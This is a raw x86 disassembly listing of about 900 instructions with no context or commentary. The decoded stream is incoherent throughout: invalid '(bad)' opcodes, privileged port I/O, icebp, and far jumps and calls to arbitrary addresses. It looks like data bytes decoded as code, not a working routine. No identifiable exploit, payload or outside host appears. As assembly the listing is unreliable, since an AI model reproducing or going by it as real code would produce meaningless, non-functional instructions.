  414405:	out    0x6d,eax
  414407:	arpl   WORD PTR ds:0x3f11d587,bp
  41440d:	icebp  
  41440e:	ret    0x3095
  414411:	fild   WORD PTR [ebx]
  414413:	add    BYTE PTR [edi],0xc7
  414416:	repnz out 0xeb,eax
  414419:	xchg   BYTE PTR [edi],bh
  41441b:	xchg   esi,eax
  41441c:	scas   al,BYTE PTR es:[edi]
  41441d:	jge    0x4143f0
  41441f:	dec    eax
  414420:	add    al,0xe0
  414422:	pop    ds
  414423:	push   ecx
  414424:	and    eax,0xb49ca72f
  414429:	push   0xd5c91cfd
  41442e:	push   0x2f
  414430:	lds    ebx,FWORD PTR [eax-0x21b6c810]
  414436:	adc    eax,0xf7bcde18
  41443b:	or     al,0xf
  41443d:	iret   
  41443e:	jne    0x414424
  414440:	jmp    0x1c47:0x838f5d26
  414447:	pop    eax
  414448:	in     eax,dx
  414449:	mov    ah,0x9d
  41444b:	nop
  41444c:	fistp  WORD PTR [esi]
  41444e:	sub    cl,bh
  414450:	sub    BYTE PTR [ebx],ch
  414452:	pop    esp
  414453:	mov    esp,0xb58ada0b
  414458:	daa    
  414459:	je     0x414458
  41445b:	shl    DWORD PTR [esi-0x13e15417],cl
  414461:	cmp    bh,BYTE PTR [esi+0x4e52d2c8]
  414467:	test   DWORD PTR [esi],0xebec0986
  41446d:	pusha  
  41446e:	imul   esp,DWORD PTR [edx],0x74
  414471:	mov    eax,ds:0xdf25ab1b
  414476:	sub    ah,bh
  414478:	sub    BYTE PTR [esi],ch
  41447a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447b:	cmovae ebp,DWORD PTR [ebx-0x3]
  41447f:	jmp    0xc514aa50
  414484:	cmp    edi,DWORD PTR [edx-0x26]
  414487:	(bad)  
  414488:	adc    BYTE PTR [edx-0x17469399],al
  41448e:	repnz mov cl,0xeb
  414491:	cmp    DWORD PTR ds:0x6b591bbb,ebx
  414497:	fwait
  414498:	shr    eax,1
  41449a:	loop   0x4144a0
  41449c:	and    ebx,ecx
  41449e:	add    DWORD PTR [ebx],esi
  4144a0:	repnz pop ds
  4144a2:	inc    esp
  4144a3:	(bad)  
  4144a4:	add    DWORD PTR [ecx],ebp
  4144a6:	(bad)  
  4144a7:	call   0x24148296
  4144ac:	in     eax,0x90
  4144ae:	pop    ss
  4144af:	cmp    cl,dl
  4144b1:	icebp  
  4144b2:	adc    al,0x28
  4144b4:	jl     0x414495
  4144b6:	mov    esi,ebp
  4144b8:	imul   DWORD PTR [eax]
  4144ba:	inc    esi
  4144bb:	pop    esp
  4144bc:	sub    al,0x7f
  4144be:	std    
  4144bf:	fidiv  WORD PTR [edi]
  4144c1:	stc    
  4144c2:	call   0x5eae7810
  4144c7:	xchg   edi,eax
  4144c8:	xchg   esp,eax
  4144c9:	fild   WORD PTR [eax+esi*1-0x56867398]
  4144d0:	outs   dx,BYTE PTR ds:[esi]
  4144d1:	push   edx
  4144d2:	test   DWORD PTR [esi-0x550c0f15],edx
  4144d8:	sub    eax,0x6bc13315
  4144dd:	fbstp  TBYTE PTR [ecx+0x395da84b]
  4144e3:	sub    al,0x12
  4144e5:	je     0x414515
  4144e7:	aad    0xe6
  4144e9:	xchg   ecx,eax
  4144ea:	pop    ecx
  4144eb:	shr    BYTE PTR [ebx],cl
  4144ed:	mov    eax,ds:0xcf38ad7c
  4144f2:	out    dx,al
  4144f3:	(bad)  
  4144f4:	in     eax,0x25
  4144f6:	or     eax,0xdf3d8ecd
  4144fb:	jle    0x4144e9
  4144fd:	push   ebx
  4144fe:	cmp    BYTE PTR es:[edi+0x66],ch
  414502:	inc    eax
  414503:	mov    WORD PTR ds:0x54e90e3f,ds
  414509:	call   0x6045d8f4
  41450e:	dec    ebx
  41450f:	clc    
  414510:	fxch   st(6)
  414512:	repz push esp
  414514:	adc    esp,DWORD PTR [edx+0xfa2f5fc]
  41451a:	jp     0x414503
  41451c:	jp     0x414569
  41451e:	lods   al,BYTE PTR ds:[esi]
  41451f:	enter  0x79b,0x7e
  414523:	sub    eax,0xf4f2bf63
  414528:	(bad)  
  414529:	lods   eax,DWORD PTR ds:[esi]
  41452a:	popa   
  41452b:	or     BYTE PTR [ebx+0x478202db],ch
  414531:	jl     0x4144fb
  414533:	enter  0xf8fe,0x23
  414537:	in     al,0xb7
  414539:	popa   
  41453a:	and    eax,0xcab7e0f8
  41453f:	into   
  414540:	sub    al,0x57
  414542:	xchg   esp,eax
  414543:	or     DWORD PTR [esi+0x1b2bcfca],esp
  414549:	dec    esp
  41454a:	or     bh,cl
  41454c:	adc    edx,0xc82b51ab
  414552:	adc    al,bh
  414554:	and    al,0x6f
  414556:	std    
  414557:	push   cs
  414558:	pop    esp
  414559:	mov    esi,DWORD PTR [esi]
  41455b:	adc    bh,al
  41455d:	test   al,0xc9
  41455f:	out    dx,eax
  414560:	cmp    al,0xb
  414562:	inc    ebp
  414563:	ins    BYTE PTR es:[edi],dx
  414564:	jmp    0x4145c7
  414566:	sub    ebx,eax
  414568:	or     dh,BYTE PTR [ebx-0x7b]
  41456b:	out    dx,eax
  41456c:	mov    bl,ch
  41456e:	dec    esi
  41456f:	scas   al,BYTE PTR es:[edi]
  414570:	jg     0x41458e
  414572:	cmp    BYTE PTR [esi+0x22],ah
  414575:	lea    esi,[ebp+0x21]
  414578:	inc    esi
  414579:	aad    0xfc
  41457b:	out    0xbb,eax
  41457d:	ds out 0xd4,eax
  414580:	xchg   ebx,eax
  414581:	mov    eax,ds:0x64a6c6ee
  414586:	repz push ebp
  414588:	jns    0x414602
  41458a:	mov    ds:0x3290ae4a,eax
  41458f:	xchg   ebp,eax
  414590:	stos   DWORD PTR es:[edi],eax
  414591:	(bad)
  414594:	sub    edx,DWORD PTR [ebx+0x62]
  414597:	out    0x1,al
  414599:	jmp    0xe2de702b
  41459e:	dec    eax
  41459f:	ret    
  4145a0:	add    eax,0xd20882c1
  4145a5:	pop    eax
  4145a6:	sub    eax,0xf023eb2a
  4145ab:	out    dx,al
  4145ac:	jmp    0xd7bfa468
  4145b1:	(bad)  
  4145b3:	test   DWORD PTR [di+0x4c1d],ecx
  4145b8:	fisubr DWORD PTR es:[edi]
  4145bb:	add    eax,0xb7eb8ceb
  4145c0:	mov    edx,0xaf308b84
  4145c5:	or     edi,DWORD PTR [ecx]
  4145c7:	jmp    0xc7edbc38
  4145cc:	scas   al,BYTE PTR es:[edi]
  4145cd:	mov    esp,0xe7600807
  4145d2:	cld    
  4145d3:	ret    
  4145d4:	push   ds
  4145d5:	stos   DWORD PTR es:[edi],eax
  4145d6:	push   0xc302c088
  4145db:	enter  0xcbd5,0x53
  4145df:	mov    ss,eax
  4145e1:	dec    ecx
  4145e2:	test   DWORD PTR [edx],esi
  4145e4:	jmp    0x4145fe
  4145e6:	test   BYTE PTR [eax+0x52a114be],al
  4145ec:	retf   0xf4df
  4145ef:	cmp    al,0x9b
  4145f1:	ds jmp 0xfd71f68b
  4145f7:	fistp  DWORD PTR [ebp+0x26]
  4145fa:	fsub   DWORD PTR [edi+eiz*4+0x2c]
  4145fe:	shl    DWORD PTR ss:[ebp+0x75],1
  414602:	(bad)  
  414603:	icebp  
  414604:	imul   esp,DWORD PTR [esi],0x48
  414607:	sub    DWORD PTR [ecx-0x178002f5],ebx
  41460d:	xchg   edx,eax
  41460e:	jo     0x414659
  414610:	inc    ebp
  414612:	mov    ds:0xdce00816,al
  414617:	mov    dh,0xe4
  414619:	das    
  41461a:	add    al,0x2b
  41461c:	mov    ds:0x1156cdf2,al
  414621:	lahf   
  414622:	lea    ecx,[eax]
  414624:	jo     0x4145d9
  414626:	cld    
  414627:	dec    edx
  414628:	add    esp,DWORD PTR fs:[edi+0x65]
  41462c:	loop   0x414627
  41462e:	mov    ebx,0x57df8c30
  414633:	int3   
  414634:	inc    eax
  414635:	test   eax,0x1dc03aa3
  41463a:	dec    ebp
  41463b:	out    0x79,al
  41463d:	sbb    bh,ch
  41463f:	repz mov esi,0x1d53110a
  414645:	fsub   DWORD PTR [ebx-0x38]
  414648:	add    ah,BYTE PTR [edi+0x5]
  41464b:	mov    ds:0x6539e68b,eax
  414650:	mov    ds:0xeb28a8b9,al
  414655:	ret    
  414656:	mov    ds:0x1af69e39,eax
  41465b:	jl     0x414622
  41465d:	fmulp  st(7),st
  41465f:	dec    eax
  414660:	jmp    0xc31211da
  414665:	iret   
  414666:	leave  
  414667:	add    bl,ch
  414669:	es add al,0xf8
  41466c:	xchg   edx,eax
  41466d:	pop    ss
  41466e:	ja     0x414635
  414670:	adc    ebx,esp
  414672:	cmp    al,0x99
  414674:	sub    BYTE PTR [esi+esi*1],al
  414677:	or     BYTE PTR [ecx+eax*8+0x28],al
  41467b:	sub    ebx,0x65
  41467e:	(bad)  
  41467f:	mov    ch,0x36
  414681:	loop   0x414630
  414683:	cmp    bl,BYTE PTR ds:0x876642f0
  414689:	fidivr WORD PTR [esp+esi*1]
  41468c:	xor    BYTE PTR [eax+0x79],dl
  41468f:	fmul   DWORD PTR [ebx-0x9]
  414692:	loop   0x4146e8
  414694:	mov    al,0xdf
  414696:	call   0xad77b4cc
  41469b:	out    0xe7,eax
  41469d:	fist   WORD PTR [eax+0x38e988d6]
  4146a3:	xor    BYTE PTR [ebx+ebp*1],dh
  4146a6:	std    
  4146a7:	lahf   
  4146a8:	mov    al,ds:0x64f6757e
  4146ad:	cli    
  4146ae:	sbb    ecx,eax
  4146b0:	dec    esi
  4146b1:	into   
  4146b2:	out    dx,al
  4146b3:	xchg   edx,eax
  4146b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146b5:	mov    bh,0x9c
  4146b7:	and    eax,0xbc02ac9a
  4146bc:	fwait
  4146bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146be:	jnp    0x4146c2
  4146c0:	in     al,0xa1
  4146c2:	sbb    esp,DWORD PTR [esi+0x3b]
  4146c5:	dec    esi
  4146c6:	call   0x6120baa4
  4146cb:	jmp    0x41472d
  4146cd:	dec    ebp
  4146ce:	pop    es
  4146cf:	inc    esi
  4146d0:	mov    esi,0xdc59fd42
  4146d5:	(bad)  
  4146d6:	rcl    DWORD PTR [ebp-0x37a179aa],cl
  4146dc:	mov    BYTE PTR [ecx+0x60],ch
  4146df:	inc    ebx
  4146e0:	pop    esi
  4146e1:	es ret 
  4146e3:	cmp    ebx,ebp
  4146e5:	test   eax,0xe90446e3
  4146ea:	cwde   
  4146eb:	pop    esi
  4146ec:	sbb    dh,0x6b
  4146ef:	stos   BYTE PTR es:[edi],al
  4146f0:	jecxz  0x414695
  4146f2:	mov    al,BYTE PTR [eax]
  4146f4:	adc    eax,0xe685dbcf
  4146f9:	stos   BYTE PTR es:[edi],al
  4146fa:	sahf   
  4146fb:	dec    esi
  4146fc:	lds    ecx,FWORD PTR [esi+0x1ded787d]
  414702:	pop    ebp
  414703:	into   
  414704:	mov    cl,al
  414706:	pop    ebp
  414707:	and    ebp,DWORD PTR [ebx+ebx*8+0x4f30303d]
  41470e:	sub    BYTE PTR [ebx],bl
  414710:	in     al,0xe5
  414712:	inc    edx
  414713:	fistp  WORD PTR [edi+0x3959496b]
  414719:	add    bh,ch
  41471b:	or     al,0xbe
  41471d:	mov    ds:0xe0d8e38f,eax
  414722:	or     DWORD PTR [esi+eiz*2+0x7c1831cc],ecx
  414729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41472a:	enter  0xeb52,0x4b
  41472e:	fsubr  QWORD PTR [esi]
  414730:	cwde   
  414731:	adc    al,0x98
  414733:	mov    bh,0xb7
  414735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414736:	xlat   BYTE PTR ds:[ebx]
  414737:	sub    esi,DWORD PTR [edx]
  414739:	fild   WORD PTR [ebx+esi*2]
  41473c:	cdq    
  41473d:	jns    0x4146cc
  41473f:	pop    es
  414740:	aas    
  414741:	fistp  WORD PTR [eiz*8+0x54449a41]
  414748:	mov    edx,0x1391fd71
  41474d:	retf   0xd589
  414750:	jo     0x41474b
  414752:	add    edi,DWORD PTR [ebp+0x48c403fd]
  414758:	mov    BYTE PTR ds:0x44ac442d,0x1
  41475f:	test   dl,0x93
  414762:	mov    ebp,0xf90c3d7
  414767:	call   0x19f7272a
  41476c:	fisttp WORD PTR ds:0xbdb3bb9a
  414772:	cld    
  414773:	(bad)  
  414774:	mul    al
  414776:	std    
  414777:	inc    ebx
  414778:	mov    al,ds:0x20d3802b
  41477d:	mov    esi,0xed6b57c1
  414782:	rcl    edi,1
  414784:	xchg   esp,eax
  414785:	jp     0x4147aa
  414787:	and    al,0xeb
  414789:	mov    bl,0x39
  41478b:	inc    edi
  41478c:	es mov eax,ebx
  41478f:	mov    al,0xbe
  414791:	fnstsw ax
  414793:	stc    
  414794:	std    
  414795:	xor    BYTE PTR [ebx+edi*4+0x55],0xe6
  41479a:	jmp    DWORD PTR [esi-0x26]
  41479d:	aad    0x79
  41479f:	xor    BYTE PTR [ecx],ch
  4147a1:	inc    esi
  4147a2:	scas   eax,DWORD PTR es:[edi]
  4147a3:	and    edi,DWORD PTR [ebx]
  4147a5:	push   edi
  4147a6:	in     eax,0xc7
  4147a8:	or     eax,DWORD PTR [edx]
  4147aa:	cwde   
  4147ab:	mov    eax,0x8bbff645
  4147b0:	call   0xc2be6821
  4147b5:	xchg   ebp,eax
  4147b6:	mov    esp,0xd6c35f75
  4147bb:	sbb    eax,ebx
  4147bd:	fimul  WORD PTR [ecx+0xf]
  4147c0:	in     al,0xc0
  4147c2:	std    
  4147c3:	and    eax,0x4b84cf25
  4147c8:	in     al,dx
  4147c9:	and    al,0xe
  4147cb:	dec    ecx
  4147cc:	int3   
  4147cd:	icebp  
  4147ce:	pop    ecx
  4147cf:	ret    0xca0f
  4147d2:	dec    al
  4147d4:	int    0x90
  4147d6:	xor    al,0x6e
  4147d8:	test   BYTE PTR [eax],ah
  4147da:	jp     0x4147e9
  4147dc:	scas   eax,DWORD PTR es:[edi]
  4147dd:	xor    edx,DWORD PTR [edi]
  4147df:	mov    ebp,0xed308aeb
  4147e4:	daa    
  4147e5:	faddp  st(2),st
  4147e7:	jne    0x414842
  4147e9:	fistp  WORD PTR [ecx-0x55a14888]
  4147ef:	sub    cl,BYTE PTR [esi+0xd]
  4147f2:	clc    
  4147f3:	cmp    DWORD PTR [ebp+0x1],esp
  4147f6:	lods   eax,DWORD PTR ds:[esi]
  4147f7:	dec    eax
  4147f8:	fistp  WORD PTR [ecx-0x15]
  4147fb:	jecxz  0x4147e5
  4147fd:	fild   QWORD PTR [edi+0x5be13706]
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	jbe    0x41484b
  414806:	std    
  414807:	(bad)
  41480c:	dec    DWORD PTR [edx]
  41480e:	test   bl,dl
  414810:	sub    al,0x5f
  414812:	test   DWORD PTR [ebp-0x6a],edi
  414815:	pop    edi
  414816:	adc    eax,0xe01f6414
  41481b:	into   
  41481c:	hlt    
  41481d:	int    0x6a
  41481f:	dec    ebp
  414820:	jmp    0x414806
  414822:	xchg   esp,eax
  414823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414824:	pop    esp
  414825:	repz cld 
  414827:	in     al,dx
  414828:	or     BYTE PTR [ebp+0x3218ecaf],ch
  41482e:	popf   
  41482f:	enter  0x210f,0x70
  414833:	fwait
  414834:	inc    esp
  414835:	(bad)  
  414836:	loope  0x414860
  414838:	jmp    0x41489f
  41483a:	fisub  WORD PTR [ecx+0x9]
  41483d:	or     eax,0x4efafcb
  414842:	pop    eax
  414843:	ins    DWORD PTR es:[edi],dx
  414844:	inc    edi
  414845:	xchg   esi,eax
  414846:	dec    ebp
  414847:	mov    bh,0xd6
  414849:	fistp  WORD PTR [eax+edx*8]
  41484c:	popa   
  41484d:	mov    ds:0x39eb57b1,al
  414852:	(bad)  
  414853:	fst    DWORD PTR [edi+0x3a]
  414856:	or     eax,0xccdfd1dd
  41485b:	xchg   edx,eax
  41485c:	in     al,dx
  41485d:	jl     0x414819
  41485f:	das    
  414860:	adc    al,0x3e
  414862:	lea    ecx,[esi-0x15]
  414865:	lods   eax,DWORD PTR ds:[esi]
  414866:	clc    
  414867:	sbb    BYTE PTR [esi-0x4763f356],0xdf
  41486e:	std    
  41486f:	xchg   edx,eax
  414870:	aas    
  414871:	adc    al,0xe8
  414873:	add    ecx,DWORD PTR [ecx-0x31]
  414876:	cld    
  414877:	icebp  
  414878:	fmul   DWORD PTR [edx+0x1a]
  41487b:	push   ss
  41487c:	xchg   edi,eax
  41487d:	repz push ds
  41487f:	retf   
  414880:	cli    
  414881:	ins    DWORD PTR es:[edi],dx
  414882:	add    bh,dh
  414884:	xchg   esi,eax
  414885:	and    esp,DWORD PTR [ebp-0x3b]
  414888:	inc    eax
  414889:	inc    edx
  41488a:	std    
  41488b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41488c:	pop    ebx
  41488d:	mov    ecx,0xd2d6199d
  414892:	jbe    0x41485c
  414894:	hlt    
  414895:	(bad)  
  414896:	and    eax,0x310efa4c
  41489b:	test   eax,0x725f02eb
  4148a0:	rcl    bh,1
  4148a2:	pop    ss
  4148a3:	adc    edi,DWORD PTR [ebx+0x9]
  4148a6:	add    esi,DWORD PTR [ecx-0x4a35f215]
  4148ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ad:	data16 ficomp DWORD PTR [eax-0x15]
  4148b1:	sub    esp,0x75
  4148b4:	xor    DWORD PTR [ebx],eax
  4148b6:	add    eax,0x73390b46
  4148bb:	enter  0xa698,0xbc
  4148bf:	leave  
  4148c0:	(bad)  
  4148c1:	cdq    
  4148c2:	mov    eax,ds:0x1024eba2
  4148c7:	jle    0x41490a
  4148c9:	nop
  4148ca:	push   ss
  4148cb:	xchg   BYTE PTR [edi+ebx*8-0x4f],ch
  4148cf:	imul   ebp,DWORD PTR [ecx],0x911eb45
  4148d5:	ss sbb eax,0xcffbe378
  4148db:	pop    edx
  4148dc:	out    dx,eax
  4148dd:	push   ecx
  4148de:	js     0x4148a8
  4148e0:	outs   dx,DWORD PTR ds:[esi]
  4148e1:	int    0x9
  4148e3:	int    0x9d
  4148e5:	pop    edi
  4148e6:	(bad)  
  4148e7:	fldln2 
  4148e9:	push   0x4c66f9b0
  4148ee:	std    
  4148ef:	cmp    DWORD PTR [edx+0x54],esp
  4148f2:	aas    
  4148f3:	in     al,dx
  4148f4:	pop    esp
  4148f5:	or     BYTE PTR [edx],ah
  4148f7:	jbe    0x41491b
  4148f9:	fimul  WORD PTR [eax-0x1050e80a]
  4148ff:	sub    BYTE PTR [esi-0x5d698bc1],dh
  414905:	test   al,0xfc
  414907:	icebp  
  414908:	out    0x24,eax
  41490a:	jle    0x41488c
  41490c:	pop    esi
  41490d:	retf   
  41490e:	or     cl,al
  414910:	retf   
  414911:	or     edi,DWORD PTR [edi]
  414913:	call   0x10df:0xc62e5b1b
  41491a:	jmp    0xb7ced4e7
  41491f:	sar    dh,0x42
  414922:	mov    ebp,0x20e0379f
  414927:	sbb    ch,BYTE PTR [ebp+0x32]
  41492a:	ds sbb ch,bl
  41492d:	(bad)  
  41492f:	adc    bl,ch
  414931:	mov    DWORD PTR [ecx+0xc],edx
  414934:	jns    0x4148c6
  414936:	xchg   ebp,eax
  414937:	mov    cl,0x4
  414939:	rol    DWORD PTR [edi],1
  41493b:	jecxz  0x4148fc
  41493d:	rol    DWORD PTR [eax-0x45208369],1
  414943:	shl    BYTE PTR [ebx],0xbb
  414946:	loop   0x41497f
  414948:	out    0xbd,al
  41494a:	lock pop edx
  41494c:	fwait
  41494d:	das    
  41494e:	in     eax,dx
  41494f:	push   ds
  414950:	mov    bh,0x6
  414952:	inc    edx
  414953:	enter  0xddd1,0xe7
  414957:	or     bh,BYTE PTR [esi-0x266c8fe]
  41495d:	std    
  41495e:	fwait
  41495f:	addr16 jmp 0x414990
  414962:	in     eax,0x86
  414964:	inc    edi
  414965:	les    edi,FWORD PTR [eax+ecx*8+0x22]
  414969:	inc    edx
  41496a:	jle    0x4149ea
  41496c:	or     eax,0xe6185dc7
  414971:	iret   
  414972:	xchg   ecx,eax
  414973:	pop    ss
  414974:	std    
  414975:	xor    ch,BYTE PTR [ebp-0x3f680e88]
  41497b:	(bad)  
  41497c:	(bad)  [ebx+ebx*2-0x40]
  414980:	js     0x414991
  414982:	dec    ecx
  414983:	mov    ds:0x2ab7181,al
  414988:	in     al,dx
  414989:	pop    ecx
  41498a:	cmp    esp,DWORD PTR [ebp+0x3a]
  41498d:	ja     0x4149d7
  41498f:	add    ecx,DWORD PTR [esi-0x5b9ec1]
  414995:	inc    esp
  414996:	fst    DWORD PTR [ebp-0x15]
  414999:	mov    edi,0xbc90d215
  41499e:	mov    bh,0xc8
  4149a0:	jle    0x41493c
  4149a2:	aas    
  4149a3:	mov    bh,0xbb
  4149a5:	les    esp,FWORD PTR [edx+0x416feb39]
  4149ab:	(bad)  
  4149ac:	or     BYTE PTR [ecx+0x2a],al
  4149af:	fild   WORD PTR [ecx+ecx*8-0x75c037b8]
  4149b6:	cmp    DWORD PTR [edx+0x1c],ebx
  4149b9:	mov    eax,ds:0x73eb94a9
  4149be:	aad    0x2a
  4149c0:	std    
  4149c1:	ja     0x414a2f
  4149c3:	int3   
  4149c4:	in     eax,dx
  4149c5:	dec    ebx
  4149c6:	and    dh,bl
  4149c8:	jno    0x414a37
  4149ca:	cmp    BYTE PTR [edi+ecx*2],0xc1
  4149ce:	cmc    
  4149cf:	xchg   DWORD PTR [esi+0x2e],ecx
  4149d2:	fisttp QWORD PTR [ecx-0x7dd3e0cc]
  4149d8:	jmp    0x4149bf
  4149da:	cdq    
  4149db:	add    al,0x25
  4149dd:	jo     0x41497e
  4149df:	and    dl,dh
  4149e1:	add    al,0xf0
  4149e3:	sub    DWORD PTR [ebx-0x2a],0x27
  4149e7:	mov    eax,0x9f11572a
  4149ec:	fld    TBYTE PTR [edx-0x70]
  4149ef:	push   esi
  4149f0:	pop    edx
  4149f1:	sar    bl,1
  4149f3:	(bad)  
  4149f4:	arpl   bx,bp
  4149f6:	call   0x910f03f
  4149fb:	sub    BYTE PTR [eax-0x14b9d7dc],0x1e
  414a02:	mov    edi,0x2faf3cf4
  414a07:	imul   ecx,DWORD PTR [ebp-0x2d9a1f21],0x6f
  414a0e:	xchg   edx,eax
  414a0f:	fst    QWORD PTR [edx+0x67]
  414a12:	movzx  eax,WORD PTR [edx]
  414a15:	repz cld 
  414a17:	lock ss iret 
  414a1a:	leave  
  414a1b:	fistp  WORD PTR [edx-0x14029365]
  414a21:	aaa    
  414a22:	xor    eax,0x8d24daed
  414a27:	ins    BYTE PTR es:[edi],dx
  414a28:	jmp    0x414a1e
  414a2a:	inc    esi
  414a2b:	inc    DWORD PTR [eax+ebx*1-0x20962acc]
  414a32:	imul   ecx,DWORD PTR [eax+ebp*4+0x7f253ab5],0xa66bfd08
  414a3d:	arpl   WORD PTR [esi],dx
  414a3f:	push   ecx
  414a40:	sbb    eax,esp
  414a42:	sub    eax,0x4057dbc8
  414a47:	scas   eax,DWORD PTR es:[edi]
  414a48:	and    eax,0xee4b2c00
  414a4d:	or     eax,0xbe45406a
  414a52:	mov    bl,0xd1
  414a54:	xchg   esp,eax
  414a55:	mov    al,ds:0x94ad68dc
  414a5a:	scas   eax,DWORD PTR es:[edi]
  414a5b:	sub    al,0x50
  414a5d:	fbld   TBYTE PTR [edx]
  414a5f:	or     DWORD PTR [ecx+edx*1-0x20f6c156],ebp
  414a66:	pushf  
  414a67:	adc    al,0x48
  414a69:	loop   0x414a36
  414a6b:	pop    ecx
  414a6c:	fbstp  TBYTE PTR [ebx-0x7c4c7104]
  414a72:	imul   esi,DWORD PTR [esi+0x5e],0x5
  414a76:	xchg   esp,eax
  414a77:	aaa    
  414a78:	ret    
  414a79:	ins    DWORD PTR es:[edi],dx
  414a7a:	cld    
  414a7b:	and    eax,0xa3840423
  414a80:	retf   
  414a81:	lock or DWORD PTR [edx-0x22],eax
  414a85:	fnstsw ax
  414a87:	xlat   BYTE PTR ds:[ebx]
  414a88:	repz mov ds:0xbc192cfa,al
  414a8e:	cld    
  414a8f:	jno    0x414a21
  414a91:	popa   
  414a92:	retf   0xe327
  414a95:	or     DWORD PTR [ecx],0xffffffc8
  414a98:	xlat   BYTE PTR ds:[ebx]
  414a99:	loop   0x414a80
  414a9b:	mov    edx,0x3ba46a76
  414aa0:	jmp    0x414af6
  414aa2:	iret   
  414aa3:	iret   
  414aa4:	sbb    ecx,DWORD PTR [ecx+0xbf8be67]
  414aaa:	push   edx
  414aab:	jge    0x414a98
  414aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aae:	mov    ebx,DWORD PTR [esi-0xe3c9261]
  414ab4:	jmp    0x1c60:0xb1946da2
  414abb:	xor    BYTE PTR [edx],cl
  414abd:	ror    BYTE PTR [edi],cl
  414abf:	sbb    BYTE PTR [edi],dl
  414ac1:	lock sahf 
  414ac3:	mov    edi,0x4882ea05
  414ac8:	sub    al,0xf9
  414aca:	fisub  WORD PTR [ebx-0x3202e7a1]
  414ad0:	adc    esi,DWORD PTR [esp+ebp*2-0x1f]
  414ad4:	jg     0x414a77
  414ad6:	adc    ecx,eax
  414ad8:	fld    DWORD PTR [edx+0x44d13903]
  414ade:	mov    dl,0x71
  414ae0:	jnp    0x414aab
  414ae2:	cld    
  414ae3:	sub    eax,DWORD PTR [edx+ecx*8+0x6c72204f]
  414aea:	cmc    
  414aeb:	(bad)  
  414aec:	mov    al,0x38
  414aee:	scas   al,BYTE PTR es:[edi]
  414aef:	mov    esi,0x21498412
  414af4:	jmp    0x414ae6
  414af6:	pushf  
  414af7:	xchg   esp,eax
  414af8:	in     al,dx
  414af9:	xor    al,BYTE PTR [esi]
  414afb:	dec    edi
  414afc:	mov    al,ds:0x94c77bca
  414b01:	stc    
  414b02:	retf   0x4cef
  414b05:	mov    edi,0xc523fcc6
  414b0a:	cld    
  414b0b:	or     eax,0x947f558
  414b10:	int3   
  414b11:	push   edx
  414b12:	sbb    ebx,DWORD PTR [edi-0x376c336b]
  414b18:	push   ebp
  414b19:	or     cl,BYTE PTR [edi-0x6]
  414b1c:	lods   eax,DWORD PTR ds:[esi]
  414b1d:	mov    bh,al
  414b1f:	or     al,0xeb
  414b21:	ss jno 0x414b41
  414b24:	add    al,0xe4
  414b26:	xchg   DWORD PTR [edi],esi
  414b28:	push   esi
  414b29:	fbstp  TBYTE PTR [ebx+0x6424c774]
  414b2f:	neg    bl
  414b31:	mov    al,ds:0xcc4b9dfb
  414b36:	pop    ecx
  414b37:	aam    0xeb
  414b39:	fs sahf 
  414b3b:	call   0x86622a6f
  414b40:	gs jo  0x414af0
  414b43:	push   edi
  414b44:	cdq    
  414b45:	inc    ecx
  414b46:	std    
  414b47:	mov    al,0xe0
  414b49:	gs push ebx
  414b4b:	jge    0x414b08
  414b4d:	adc    DWORD PTR [ebx],eax
  414b4f:	mov    edi,0xc85ac5c1
  414b54:	lahf   
  414b55:	and    ebx,DWORD PTR [ebx]
  414b57:	(bad)  
  414b58:	popf   
  414b59:	idiv   esp
  414b5b:	(bad)  
  414b5c:	into   
  414b5d:	mov    ds:0x8b9e15d,al
  414b62:	or     al,0xc8
  414b64:	xchg   edi,eax
  414b65:	repnz dec ebp
  414b67:	ficom  WORD PTR [ecx-0x14aed045]
  414b6d:	dec    ebx
  414b6e:	out    dx,eax
  414b6f:	sub    DWORD PTR [ecx],eax
  414b71:	jmp    0xf90a:0xdf58d677
  414b78:	or     ebx,DWORD PTR [eax-0xa]
  414b7b:	call   0x773ed405
  414b80:	fidiv  DWORD PTR [esi-0x6]
  414b83:	sub    eax,0xc837bf79
  414b88:	fdivr  QWORD PTR [ecx-0x61afe0f5]
  414b8e:	shl    dl,cl
  414b90:	jmp    0x414bb3
  414b92:	loop   0x414bf3
  414b94:	jecxz  0x414bec
  414b96:	xchg   ebx,eax
  414b97:	clc    
  414b98:	ret    0x7edf
  414b9b:	fistp  DWORD PTR [ecx+0x6c]
  414b9e:	inc    DWORD PTR [esi]
  414ba0:	push   edi
  414ba1:	sub    ebp,edi
  414ba3:	hlt    
  414ba4:	pop    eax
  414ba5:	adc    ebx,ebx
  414ba7:	cmc    
  414ba8:	xchg   ebx,esi
  414baa:	popf   
  414bab:	leave  
  414bac:	ins    DWORD PTR es:[edi],dx
  414bad:	push   ebp
  414bae:	repz lds edi,FWORD PTR [ebp-0x74]
  414bb2:	jne    0x414bcc
  414bb4:	dec    edx
  414bb5:	pop    ebx
  414bb6:	repz cli 
  414bb8:	shr    DWORD PTR [edi],0x92
  414bbb:	cli    
  414bbc:	adc    edx,DWORD PTR [edi+0x110480ff]
  414bc2:	adc    al,0xaa
  414bc4:	and    eax,DWORD PTR [esi+0x52]
  414bc7:	inc    ebx
  414bc8:	jmp    0x414bd9
  414bca:	adc    bh,BYTE PTR [esi]
  414bcc:	aad    0xe7
  414bce:	add    al,BYTE PTR cs:[edx-0x24]
  414bd2:	mov    ebx,0x109aca2b
  414bd7:	or     DWORD PTR [ebx],ebx
  414bd9:	nop
  414bda:	rcr    DWORD PTR [ecx],1
  414bdc:	jmp    0x414c09
  414bde:	mov    cl,BYTE PTR [ecx-0x2596fed5]
  414be4:	aam    0x5
  414be6:	retf   0x6b19
  414be9:	add    BYTE PTR [ebp-0x4f5d1df6],al
  414bef:	sbb    eax,0x36fd47a0
  414bf4:	jmp    0x7a5b39e0
  414bf9:	jmp    0x414bf1
  414bfb:	fmul   st(4),st
  414bfd:	in     eax,0x7b
  414bff:	loop   0x414c53
  414c01:	lods   al,BYTE PTR cs:[esi]
  414c03:	push   0xd8b91367
  414c08:	jmp    0x414c5d
